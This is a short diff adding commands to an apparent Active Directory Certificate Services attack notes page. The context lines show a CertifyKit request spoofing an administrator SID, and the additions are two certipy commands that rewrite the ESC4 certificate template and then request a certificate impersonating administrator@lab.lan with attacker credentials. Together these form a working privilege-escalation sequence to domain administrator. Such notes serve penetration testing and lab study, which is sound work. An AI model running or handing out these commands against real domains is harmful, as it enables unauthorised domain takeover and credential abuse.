@@ -47,3 +47,11 @@ CertifyKit.exe request /ca:cb-ca.cb.corp\CB-CA /template:'SecureUpdate' /altname
 /domain:cb.corp /alter /sidextension:S-1-5-21-2928296033-1822922359-262865665-500
 ```
 {% endcode %}
+
+```
+certipy template -u attacker -p 'P@ssw0rd' -template ESC4 -save-old
+```
+
+```
+certipy req -u attacker -p 'P@ssw0rd' -ca lab-DC-CA -target 192.168.1.2 -template ESC4 -upn administrator@lab.lan
+```
